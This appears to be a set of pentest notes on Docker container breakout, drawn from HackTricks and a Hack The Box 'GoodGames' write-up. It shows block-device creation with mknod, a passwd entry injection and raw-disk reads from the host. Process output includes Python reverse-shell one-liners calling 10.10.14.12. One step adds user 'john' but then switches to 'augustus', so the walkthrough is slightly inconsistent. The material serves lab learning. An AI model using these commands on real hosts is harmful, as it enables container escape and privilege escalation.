# DOCKER BREAKOUT

Am I in a container
https://stackoverflow.com/questions/23513045/how-to-check-if-a-process-is-running-inside-docker-container

```bash
#!/bin/bash
if [ -f /.dockerenv ]; then
    echo "I'm inside matrix ;(";
else
    echo "I'm living in real world!";
fi
```


https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation

[](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells)

Privilege Escalation with 2 shells

If you have access as **root inside a container** and you have **escaped as a non privileged user to the host**, you can abuse both shells to **privesc inside the host** if you have the capability MKNOD inside the container (it's by default) as [**explained in this post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/). With such capability the root user within the container is allowed to **create block device files**. Device files are special files that are used to **access underlying hardware & kernel modules**. For example, the /dev/sda block device file gives access to **read the raw data on the systems disk**.

Docker safeguards against block device misuse within containers by enforcing a cgroup policy that **blocks block device read/write operations**. Nevertheless, if a block device is **created inside the container**, it becomes accessible from outside the container via the **/proc/PID/root/** directory. This access requires the **process owner to be the same** both inside and outside the container.

**Exploitation** example from this [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):

```
# DOCKER BREAKOUT
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "john:x:1001:1001:john,,,:/home/john:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$ 
```

```
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda 
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```